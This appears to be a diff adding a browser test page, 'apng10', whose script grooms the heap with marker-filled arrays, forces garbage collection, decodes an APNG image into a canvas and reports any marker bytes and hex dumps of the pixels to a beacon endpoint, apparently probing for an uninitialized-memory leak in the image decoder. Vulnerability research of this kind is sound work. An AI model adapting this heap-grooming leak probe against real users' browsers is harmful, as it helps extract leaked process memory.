@@ -1,0 +1,28 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>apng10</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function img(url){ return new Promise(function(res){ var i=new Image(); i.onload=function(){res(i);}; i.onerror=function(){res(null);}; i.src=url; }); }
+function hexAll(d,n){ var s=''; for(var i=0;i<n*4;i++) s+=('0'+d[i].toString(16)).slice(-2); return s; }
+function drawN(w,im){ var c=document.createElement('canvas'); c.width=w; c.height=1; var g=c.getContext('2d'); g.drawImage(im,0,0); var d=g.getImageData(0,0,w,1).data; window.__last=c; return d; }
+var seq=0;
+function load(im){ return img('/corpus/'+im+'?n='+(++seq)); }
+function fill(n,size,val){ var a=[]; for(var i=0;i<n;i++){ var u=new Uint8Array(size); for(var j=0;j<size;j++) u[j]=val; a.push(u); } return a; }
+function forceGC(){ for(var i=0;i<10;i++){ var j=new ArrayBuffer(4*1024*1024); j=null; } return 1; }
+function count(d,n,val){ var c=0; for(var i=0;i<n*4;i++) if(d[i]===val) c++; return c; }
+function report(tag,d,n){
+  b(tag+'-c11-'+count(d,n,0x11)+'-c22-'+count(d,n,0x22)+'-c33-'+count(d,n,0x33)+'-c44-'+count(d,n,0x44)+'-c55-'+count(d,n,0x55)+'-c66-'+count(d,n,0x66)+'-c77-'+count(d,n,0x77));
+  b(tag+'-hex-'+hexAll(d.slice(0,32*4),32));
+}
+function arm(size,val){
+  var a=fill(4000,size,val); a.length=0; a=null; forceGC();
+  return load('apng-fw1.png').then(function(im){ var d=drawN(64,im); report('A10-S'+size, d, 64); });
+}
+var steps=[[16,0x11],[32,0x22],[64,0x33],[128,0x44],[256,0x55],[512,0x66],[1024,0x77]];
+var k=0;
+function step(){
+  if(k>=steps.length){ b('A10-DONE'); return; }
+  var s=steps[k++];
+  arm(s[0],s[1]).then(step);
+}
+function boot(){ b('A10-BOOT'); step(); }
+boot();
+</script></head><body><p>apng10</p></body></html>
